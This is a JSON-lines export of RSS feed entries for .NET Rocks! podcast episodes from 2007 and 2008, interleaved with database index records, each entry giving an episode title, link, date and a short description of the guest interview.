{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=323","title":"Issam Elbaytam and Scott Wileke","published":{"$wrap":"$date","v":1205211145000,"h":"2008-03-11T04:52:25.000Z"},"starred":false,"read":false,"content":"Carl talks about Active Reports and other great new tools on the way from the boys at Datadynamics.","author":false,"_id":{"$wrap":"$oid","v":569}}
{"k":"0000000082","o":"0000000446","v":"001"}
{"_id":570,"_uid":570,"_dt":1373728934162,"_s":"6aaac0e0b76308124d911534423a93b3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=322","title":"Stephen Forte on Remote/Distributed Teams","published":{"$wrap":"$date","v":1204776000000,"h":"2008-03-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Stephen Forte is back, this time talking about working with distributed teams. He shares his valuable experiences and insights.","author":false,"_id":{"$wrap":"$oid","v":570}}
{"k":"0000000082","o":"0000000400","v":"001"}
{"_id":571,"_uid":571,"_dt":1373728934162,"_s":"acbb3c38aa203ab17812a2709309b880"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=321","title":"Catching up with Tim Huckaby","published":{"$wrap":"$date","v":1204603200000,"h":"2008-03-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Tim is back to talk about things like Office development, the Microsoft/Yahoo story, and more.","author":false,"_id":{"$wrap":"$oid","v":571}}
{"k":"0000000082","o":"0000000441","v":"001"}
{"_id":572,"_uid":572,"_dt":1373728934163,"_s":"f30c125cd2d1c67b073c27aa30e14a1d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=320","title":"John Bristowe on Advancing Your Career","published":{"$wrap":"$date","v":1204171200000,"h":"2008-02-28T04:00:00.000Z"},"starred":false,"read":false,"content":"John Bristowe from Microsoft Canada talks about a new initiative from Microsoft to help .NET developers further their career.","author":false,"_id":{"$wrap":"$oid","v":572}}
{"k":"0000000082","o":"0000000395","v":"001"}
{"_id":573,"_uid":573,"_dt":1373728934164,"_s":"c047890e0d9e638b203dfb2b476b4da8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=319","title":"Julie Lerman on the Entity Framework","published":{"$wrap":"$date","v":1203998400000,"h":"2008-02-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Julie Lerman calls in to tell us about her experiences with the Entity Framework.","author":false,"_id":{"$wrap":"$oid","v":573}}
{"k":"0000000082","o":"0000000445","v":"001"}
{"_id":574,"_uid":574,"_dt":1373728934165,"_s":"0ad7770906ec725ec9f20b19ca1c38bd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=318","title":"Catching up with Dr. Neil Roodyn","published":{"$wrap":"$date","v":1203566400000,"h":"2008-02-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Dr. Neil about Mix, Live Services, WPF, Silverlight, Grava, and other cool technology he's been involved with.","author":false,"_id":{"$wrap":"$oid","v":574}}
{"k":"0000000082","o":"0000000439","v":"001"}
{"_id":575,"_uid":575,"_dt":1373728934165,"_s":"a6241fc8da7566ff840568a7d664ab31"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=317","title":"Christian Weyer on the Internet Service Bus","published":{"$wrap":"$date","v":1203393600000,"h":"2008-02-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Christain Weyer about the features functionality of the new Microsoft Internet Service Bus.","author":false,"_id":{"$wrap":"$oid","v":575}}
{"k":"0000000082","o":"0000000625","v":"001"}
{"_id":576,"_uid":576,"_dt":1373728934166,"_s":"c538ae065c37627396c923dc1bfc44bc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=316","title":"Scott Guthrie on Mix and Matthew Manela on the MSDN Code Gallery","published":{"$wrap":"$date","v":1202961600000,"h":"2008-02-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Scott Guthrie about what to expect this year at Mix.  Following that interview, the boys talk with Matthew Manela about the MSDN Code Gallery.  Matthew also discusses his experiences starting at Microsoft as an intern and working his way up the food chain.","author":false,"_id":{"$wrap":"$oid","v":576}}
{"k":"0000000082","o":"0000000476","v":"001"}
{"_id":577,"_uid":577,"_dt":1373728934167,"_s":"72ad51f1cd6e16a30b25bade184898a3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=315","title":"Brian Noyes: WPF Update","published":{"$wrap":"$date","v":1202788800000,"h":"2008-02-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Brian Noyes catches us up on the state of WPF, talking about the new Composite WPF project (codename Prism), followed by a discussion on the state of Workflow Foundation (WF).","author":false,"_id":{"$wrap":"$oid","v":577}}
{"k":"0000000082","o":"0000000528","v":"001"}
{"_id":578,"_uid":578,"_dt":1373728934168,"_s":"b3389386119c7ad26d81d4aaf2baf6e2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=314","title":"Adam Nathan on Popfly and Silverlight","published":{"$wrap":"$date","v":1202356800000,"h":"2008-02-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Adam Nathan from Microsoft joins Carl and Richard to talk about his work on the CLR team, his numerous books, and his work on popfly.com, a popular mashup site which he wrote with Silverlight 1.0 and ASP.NET Ajax.","author":false,"_id":{"$wrap":"$oid","v":578}}
{"k":"0000000082","o":"0000000584","v":"001"}
{"_id":579,"_uid":579,"_dt":1373728934169,"_s":"9ce6967d68c869b4558bc179fae71c42"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=313","title":"Miguel de Icaza and Geoff Norton on Mono","published":{"$wrap":"$date","v":1202184000000,"h":"2008-02-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Miguel is back to talk Mono with Geoff Norton. Many things have changed since we last talked to Miguel about the Mono project, an open-source port of the .NET Framework that runs on Windows, Linux, and the Mac. The focus is mostly about running .NET apps on the Mac.","author":false,"_id":{"$wrap":"$oid","v":579}}
{"k":"0000000082","o":"0000000383","v":"001"}
{"_id":580,"_uid":580,"_dt":1373728934169,"_s":"5c43b6dbfb5f98457d3108d97bca7841"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=312","title":"Andy Leonard on Unit Testing your Database","published":{"$wrap":"$date","v":1201752000000,"h":"2008-01-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard chat with Andy Leonard about database testing.","author":false,"_id":{"$wrap":"$oid","v":580}}
{"k":"0000000082","o":"0000000443","v":"001"}
{"_id":581,"_uid":581,"_dt":1373728934170,"_s":"51421ffa724326c2f8282638412e7713"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=311","title":"Kirk Munro on Powershell and PowerGUI","published":{"$wrap":"$date","v":1201579200000,"h":"2008-01-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Kirk Munro stops by to talk about PowerGUI, a free tool from Quest Software for PowerShell, including a beautiful script editor!","author":false,"_id":{"$wrap":"$oid","v":581}}
{"k":"0000000082","o":"0000000531","v":"001"}
{"_id":582,"_uid":582,"_dt":1373728934171,"_s":"a98c286fe748e8717a2e635a42313bf6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=310","title":"Simon Peyton Jones on Haskell and Functional Programming","published":{"$wrap":"$date","v":1201147200000,"h":"2008-01-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard chat with Simon Peyton Jones about his work with Haskell and functional programming. Along the way you'll hear about his other projects at Microsoft Research in Cambridge, England.","author":false,"_id":{"$wrap":"$oid","v":582}}
{"k":"0000000082","o":"0000000410","v":"001"}
{"_id":583,"_uid":583,"_dt":1373728934171,"_s":"d99f52e84359a3ef1bdf83d57501b4cd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=309","title":"Les Pinter Looks Back","published":{"$wrap":"$date","v":1200974400000,"h":"2008-01-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Meet the guy who sold Microsoft Word to Bill Gates! Stories abound in this lively conversation with Les Pinter.","author":false,"_id":{"$wrap":"$oid","v":583}}
{"k":"0000000082","o":"0000000454","v":"001"}
{"_id":584,"_uid":584,"_dt":1373728934172,"_s":"62b91f07a9014849762d8d3ffcbb14f8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=308","title":"Aaron Skonnard puts BizTalk and WCF Together","published":{"$wrap":"$date","v":1200542400000,"h":"2008-01-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Aaron Skonnard of Pluralsight about the WCF Adapter for Biztalk Server 2006 R2, among other related topics.","author":false,"_id":{"$wrap":"$oid","v":584}}
{"k":"0000000082","o":"0000000446","v":"001"}
{"_id":585,"_uid":585,"_dt":1373728934173,"_s":"17534d9a6b2830360c36d95613131f37"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=307","title":"Sahil Malik Shares the Point","published":{"$wrap":"$date","v":1200369600000,"h":"2008-01-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Sahil Malik talks about the latest developments and challenges around Sharepoint 2007. Sahil always brings a fresh perspective to the table.","author":false,"_id":{"$wrap":"$oid","v":585}}
{"k":"0000000082","o":"0000000437","v":"001"}
{"_id":586,"_uid":586,"_dt":1373728934174,"_s":"232863f3230af074a2b0bb1125d00932"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=306","title":"David Aiken on Bridging the Gap between Dev and IT","published":{"$wrap":"$date","v":1199937600000,"h":"2008-01-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with David Aiken about how developers can work more productively with IT professionals.","author":false,"_id":{"$wrap":"$oid","v":586}}
{"k":"0000000082","o":"0000000491","v":"001"}
{"_id":587,"_uid":587,"_dt":1373728934174,"_s":"5a7eff9a26b3d12389f31884c75be0b3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=305","title":"Steven Lees on FeedSync","published":{"$wrap":"$date","v":1199764800000,"h":"2008-01-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk feed synchronization with Steven Lees from Microsoft about FeedSync, a Windows Live Dev service for synchronizing RSS and Atom feeds, and FeedSync feeds across the web.","author":false,"_id":{"$wrap":"$oid","v":587}}
{"k":"0000000082","o":"0000000587","v":"001"}
{"_id":588,"_uid":588,"_dt":1373728934175,"_s":"d1b708b72090e19bbabbdeb18f785128"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=304","title":"Kathleen Dollard on the Evolution of Software Development","published":{"$wrap":"$date","v":1199332800000,"h":"2008-01-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Kathleen spends a little more than an hour talking with Richard and Carl about how software development has changed over the years, for better mostly. Still, change is difficult, and Kathleen provides some insight into how she approaches these changes.","author":false,"_id":{"$wrap":"$oid","v":588}}
{"k":"0000000082","o":"0000000452","v":"001"}
{"_id":589,"_uid":589,"_dt":1373728934176,"_s":"d7f15f68f2447d220800b676e162a2ef"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=303","title":"Ken Levy on Visual Studio Extensibility (VSX)","published":{"$wrap":"$date","v":1199160000000,"h":"2008-01-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk VSX with Ken Levy who these days is all about community and showing developers how to extend Visual Studio.","author":false,"_id":{"$wrap":"$oid","v":589}}
{"k":"0000000082","o":"0000000367","v":"001"}
{"_id":590,"_uid":590,"_dt":1373728934177,"_s":"f32a2626f2d9d2cd514f02fcc08af06c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=302","title":"Jeff Prosise Goes Deep on Silverlight","published":{"$wrap":"$date","v":1198728000000,"h":"2007-12-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk Silverlight with Jeff Prosise.","author":false,"_id":{"$wrap":"$oid","v":590}}
{"k":"0000000082","o":"0000000464","v":"001"}
{"_id":591,"_uid":591,"_dt":1373728934177,"_s":"5cc01c471282f58d15376027e2780ca8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=301","title":"Joe Duffy on the Task Parallel Library","published":{"$wrap":"$date","v":1198555200000,"h":"2007-12-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Microsoft's Joe Duffy about the Task Parallel Library, which promises to make multi-threaded programming easier for us all.","author":false,"_id":{"$wrap":"$oid","v":591}}
{"k":"0000000082","o":"0000000472","v":"001"}
{"_id":592,"_uid":592,"_dt":1373728934178,"_s":"fbc007577fac00e16a1de29de74dbd28"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=300","title":"Richard Campbell Tells All!","published":{"$wrap":"$date","v":1198123200000,"h":"2007-12-20T04:00:00.000Z"},"starred":false,"read":false,"content":"It's our 300th show! Can you believe it? Carl interviews Richard, who tells many stories of his experiences in electronics and computers. Don't miss the funny stories!","author":false,"_id":{"$wrap":"$oid","v":592}}
{"k":"0000000082","o":"0000000489","v":"001"}
{"_id":593,"_uid":593,"_dt":1373728934179,"_s":"a2e6630754ac4a1576c5fb4bb1fd39f4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=299","title":"Jeff Palermo on ASP.NET MVC","published":{"$wrap":"$date","v":1198036800000,"h":"2007-12-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Jeff Palermo introduces the nascent ASP.NET Model View Controler Framework. He easily explains the benefits, pitfalls, and techniques you can use to implement a MVC pattern in ASP.NET.","author":false,"_id":{"$wrap":"$oid","v":593}}
{"k":"0000000082","o":"0000000400","v":"001"}
{"_id":594,"_uid":594,"_dt":1373728934179,"_s":"6d6741af7291450130e7a109d3944d5e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=298","title":"Gael Fraiteur on PostSharp","published":{"$wrap":"$date","v":1197518400000,"h":"2007-12-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard chat with Gael Fraiteur about PostSharp, an AOP framework and toolkit for .NET.","author":false,"_id":{"$wrap":"$oid","v":594}}
{"k":"0000000082","o":"0000000594","v":"001"}
{"_id":595,"_uid":595,"_dt":1373728934180,"_s":"3e7a4d68013b7bba489a68687fe4ee5f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=297","title":"Tomas Petricek on PHP in ASP.NET and Silverlight!","published":{"$wrap":"$date","v":1197345600000,"h":"2007-12-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Tomas Petricek about Phalanger, a managed code PHP language compiler, as well as his thoughts on F# Web Tools, a toolkit which lets you write both client-side and server-side code at the same time, and the client gets converted to JavaScript.","author":false,"_id":{"$wrap":"$oid","v":595}}
{"k":"0000000082","o":"0000000515","v":"001"}
{"_id":596,"_uid":596,"_dt":1373728934181,"_s":"74caeac14b8d6e0ce2909e4a03030aec"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=296","title":"Open Source Panel Discussion at DevTeach, Vancouver","published":{"$wrap":"$date","v":1196913600000,"h":"2007-12-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard host a panel discussion on open source software at the DevTeach developer conference in Vancouver, BC. Panelists: Rod Paddock, Shaun Walker, Rob Chartier, and Sara Ford.","author":false,"_id":{"$wrap":"$oid","v":596}}
{"k":"0000000082","o":"0000000346","v":"001"}
{"_id":597,"_uid":597,"_dt":1373728934182,"_s":"b5d94c23be1eee2d27485b7ed3776b51"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=295","title":"Naveen Yajaman on Visual Studio Tools for Applications","published":{"$wrap":"$date","v":1196740800000,"h":"2007-12-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Naveen Yajaman","author":false,"_id":{"$wrap":"$oid","v":597}}
{"k":"0000000082","o":"0000000418","v":"001"}
{"_id":598,"_uid":598,"_dt":1373728934183,"_s":"e196d9e841d6dca9b472d2607094e8eb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=294","title":"Colin Miller and the .NET Micro Framework!","published":{"$wrap":"$date","v":1196308800000,"h":"2007-11-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Geek out with Carl, Richard, and Colin Miller about the .NET Micro Framework for embedded systems.","author":false,"_id":{"$wrap":"$oid","v":598}}
{"k":"0000000082","o":"0000000445","v":"001"}
{"_id":599,"_uid":599,"_dt":1373728934183,"_s":"622425fa3482b39cf5094ebb5f3fddcd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=293","title":"F# Moves Forward","published":{"$wrap":"$date","v":1196136000000,"h":"2007-11-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Don Syme, the inventor of F#, along with F# PM Luke Hoban and MS Researcher Ralf Herbrich about the future of the F# language.","author":false,"_id":{"$wrap":"$oid","v":599}}
{"k":"0000000082","o":"0000000479","v":"001"}
{"_id":600,"_uid":600,"_dt":1373728934184,"_s":"b40a158bb97915f833ddbfc0dd248b9f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=292","title":"Dot Net Nuke Discussion Panel","published":{"$wrap":"$date","v":1195790400000,"h":"2007-11-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard interview members of the Dot Net Nuke corporation and their partners in front of a live audience at the Connections conference in Las Vegas November, 2007.","author":false,"_id":{"$wrap":"$oid","v":600}}
{"k":"0000000082","o":"0000000399","v":"001"}
{"_id":601,"_uid":601,"_dt":1373728934185,"_s":"de4eac7a93365258ef818c2a3dee591d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=291","title":"Kent Alstad at Dev Connections!","published":{"$wrap":"$date","v":1195531200000,"h":"2007-11-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk scalability with Kent Alstad live from Dev Connections in Las Vegas.","author":false,"_id":{"$wrap":"$oid","v":601}}
{"k":"0000000082","o":"0000000539","v":"001"}
{"_id":602,"_uid":602,"_dt":1373728934185,"_s":"773201629b8aa0cab38e42c16b67bd06"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=290","title":"Tim Sneath and Ian Ellison-Taylor on Windows Past, Present and Future","published":{"$wrap":"$date","v":1195099200000,"h":"2007-11-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Windows veterans Tim Sneath and Ian Ellison-Taylor about the olden days of Windows, how it has evolved, and how it may look in the future from a developer perspective.","author":false,"_id":{"$wrap":"$oid","v":602}}
{"k":"0000000082","o":"0000000540","v":"001"}
{"_id":603,"_uid":603,"_dt":1373728934186,"_s":"8f061aaeb2f8e64a1fe878200bf1361a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=289","title":"Pablo Castro on Astoria","published":{"$wrap":"$date","v":1194926400000,"h":"2007-11-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Pablo Castro from the SQL Server Product Group at Microsoft talks about his work with Astoria, an infrastructure for bringing web technologies and data sources together. Astoria uses the Entity Framework, which Pablo is also involved with.","author":false,"_id":{"$wrap":"$oid","v":603}}
{"k":"0000000082","o":"0000000375","v":"001"}
{"_id":604,"_uid":604,"_dt":1373728934187,"_s":"6cc2ccc190c566d4d619e3026a43284c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=288","title":"Mark Dunn at TechEd Asia","published":{"$wrap":"$date","v":1194489570000,"h":"2007-11-08T02:39:30.000Z"},"starred":false,"read":false,"content":"We sent Mark to sit down with and interview the minds behind TechEd Asia.","author":false,"_id":{"$wrap":"$oid","v":604}}
{"k":"0000000082","o":"0000000423","v":"001"}
{"_id":605,"_uid":605,"_dt":1373728934188,"_s":"bd38e99053969b6a688e02b87d400f64"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=287","title":"Sue Mosher On Outlook","published":{"$wrap":"$date","v":1194351594000,"h":"2007-11-06T12:19:54.000Z"},"starred":false,"read":false,"content":"Sue Discusses her work in Outlook and Exchange issues as well as the coding of Outlook and the new features of Outlook 2007.","author":false,"_id":{"$wrap":"$oid","v":605}}
{"k":"0000000082","o":"0000000513","v":"001"}
{"_id":606,"_uid":606,"_dt":1373728934188,"_s":"3184c611ccdef846d3625ffacf95ed0f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=286","title":"Nikhil Kothari on Facebook.NET and Everything Else!","published":{"$wrap":"$date","v":1193889600000,"h":"2007-11-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Nikhil Kothari talks about his eperiences working at Microsoft on all things web, including ASP.NET controls and Facebook.NET. Just read his bio to see where we took this conversation.","author":false,"_id":{"$wrap":"$oid","v":606}}
{"k":"0000000082","o":"0000000403","v":"001"}
{"_id":607,"_uid":607,"_dt":1373728934189,"_s":"3fa68bad8d58f5e6f1c4c24320a2c40c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=285","title":"David Yack Talks Microsoft CRM!","published":{"$wrap":"$date","v":1193716800000,"h":"2007-10-30T04:00:00.000Z"},"starred":false,"read":false,"content":"David Yack introduces us to Microsoft CRM and related products, giving us the developer story.","author":false,"_id":{"$wrap":"$oid","v":607}}
{"k":"0000000082","o":"0000000375","v":"001"}
{"_id":608,"_uid":608,"_dt":1373728934190,"_s":"39384361995bbc645ad5afa2ce9c3c48"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=284","title":"Catching up with Brad Abrams","published":{"$wrap":"$date","v":1193284800000,"h":"2007-10-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Brad Abrams about Silverlight +Next and WPF.","author":false,"_id":{"$wrap":"$oid","v":608}}
{"k":"0000000082","o":"0000000489","v":"001"}
{"_id":609,"_uid":609,"_dt":1373728934191,"_s":"7b9cf5490ead4ff8bbf36f1875401a7c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=283","title":"Alex Daley on Windows Live Labs","published":{"$wrap":"$date","v":1193112000000,"h":"2007-10-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Alex Daley about some of the projects he's working on at Windows Live Labs, a division of Microsoft Research that focuses on shipping new web technologies.","author":false,"_id":{"$wrap":"$oid","v":609}}
{"k":"0000000082","o":"0000000496","v":"001"}
{"_id":610,"_uid":610,"_dt":1373728934191,"_s":"6a3d50f73bb7857498e26f480ad1b26c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=282","title":"Rocky Lhotka and Anthony Handley on WPF","published":{"$wrap":"$date","v":1192680000000,"h":"2007-10-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl meets up with Rocky Lhotka and his associate, Anthony Handley, at ReMix in Boston to discuss the work they have done separating the roles of designer and developer using WPF.","author":false,"_id":{"$wrap":"$oid","v":610}}
{"k":"0000000082","o":"0000000421","v":"001"}
{"_id":611,"_uid":611,"_dt":1373728934192,"_s":"f25ffc3af7f54c7996103e654b772c9f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=281","title":"Dino Esposito on AJAX Architecture","published":{"$wrap":"$date","v":1192507200000,"h":"2007-10-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard caught up with Dino Esposito at DevReach in Sofia, Bulgaria to talk about AJAX architecture.","author":false,"_id":{"$wrap":"$oid","v":611}}
{"k":"0000000082","o":"0000000502","v":"001"}
{"_id":612,"_uid":612,"_dt":1373728934193,"_s":"1e270c23bf1ce34f59652579599737f3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=280","title":"WPF Panel Discussion","published":{"$wrap":"$date","v":1192075200000,"h":"2007-10-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard host a panel discussion on Windows Presentation Foundation at DevReach in Sofia Bulgaria. Panelists: Tim Huckaby, Brian Noyes, and Todd Anglin. Chad Hower made a cameo appearance as well.","author":false,"_id":{"$wrap":"$oid","v":612}}
{"k":"0000000082","o":"0000000408","v":"001"}
{"_id":613,"_uid":613,"_dt":1373728934193,"_s":"d10d2234eea8454ff5666e250a805058"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=279","title":"Ken Getz on VSTO and Other Stuff (tm)","published":{"$wrap":"$date","v":1191902400000,"h":"2007-10-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Ken Getz checked in to talk about the latest in VSTO, and then the converstaion turned geeky.","author":false,"_id":{"$wrap":"$oid","v":613}}
{"k":"0000000082","o":"0000000468","v":"001"}
{"_id":614,"_uid":614,"_dt":1373728934194,"_s":"c4bd26ece31bd6f2aa51e750c2178a57"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=278","title":"Eli Lopian Discusses TypeMock.NET","published":{"$wrap":"$date","v":1191470400000,"h":"2007-10-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Eli Lopian about how mocking the right way can produce isolation in your test environment, allowing for more effective unit testing.","author":false,"_id":{"$wrap":"$oid","v":614}}
{"k":"0000000082","o":"0000000454","v":"001"}
{"_id":615,"_uid":615,"_dt":1373728934195,"_s":"a8fa3850a2b59041a3691a51e97d0627"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=277","title":"Venkat Subramanium on the Inevitibility of Dynamic Languages","published":{"$wrap":"$date","v":1191299073000,"h":"2007-10-02T04:24:33.000Z"},"starred":false,"read":false,"content":"Venkat shares his passionate reasoning as to why dynamic languages (with good unit tests) are the way of the future.","author":false,"_id":{"$wrap":"$oid","v":615}}
{"k":"0000000082","o":"0000000555","v":"001"}
{"_id":616,"_uid":616,"_dt":1373728934196,"_s":"66d759449fd290e74be1fc4f19c6495e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=276","title":"Mike Griffin on EntitySpaces","published":{"$wrap":"$date","v":1190865600000,"h":"2007-09-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Mike Griffin, creator of MyGeneration and EntitySpaces, talks with Carl and Richard about EntitySpaces, a persistence layer and business object system for the Microsoft .NET 2.0 Framework, as well as his experiences with LINQ and other technologies.","author":false,"_id":{"$wrap":"$oid","v":616}}
{"k":"0000000082","o":"0000000541","v":"001"}
{"_id":617,"_uid":617,"_dt":1373728934196,"_s":"a347ce881f0c5cd85da26bafcde8d027"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=275","title":"Jack Herrington on Browser Coding","published":{"$wrap":"$date","v":1190692800000,"h":"2007-09-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Jack Herrington talks browser coding: everything from JavaScript to Flash to Silverlight, if it's done in the browser Jack does it. He brings his experiences from Macromedia to the discussion, but make no mistake. Jack loves .NET!","author":false,"_id":{"$wrap":"$oid","v":617}}
{"k":"0000000082","o":"0000000565","v":"001"}
{"_id":618,"_uid":618,"_dt":1373728934197,"_s":"61036ed00fc7cd05fca09749ccfebdde"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=274","title":"Charlie Calvert and Beth Massi on VB.NET, Orcas, and the FoxPro Knitting Guild","published":{"$wrap":"$date","v":1190260800000,"h":"2007-09-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Charlie Calvert and Beth Massi spend their 60 minutes of fame talking about what they love about Orcas, how VB.NET is cool again, and what on earth are all those FoxPro people going to do with their free time.","author":false,"_id":{"$wrap":"$oid","v":618}}
{"k":"0000000082","o":"0000000595","v":"001"}
{"_id":619,"_uid":619,"_dt":1373728934198,"_s":"0e76e07025f97a92583f69550d72e384"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=273","title":"Mike Azocar and John Cook on Testing with Virtual Machines","published":{"$wrap":"$date","v":1190088000000,"h":"2007-09-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Mike Azocar and John Cook talk to Carl and Richard about using Virtualization for software testing. Of particular interest is the new features of the next version of Virtual PC. Carl also brings up the VPC vs VMWare issue. You have to listen to find out more!","author":false,"_id":{"$wrap":"$oid","v":619}}
{"k":"0000000082","o":"0000000435","v":"001"}
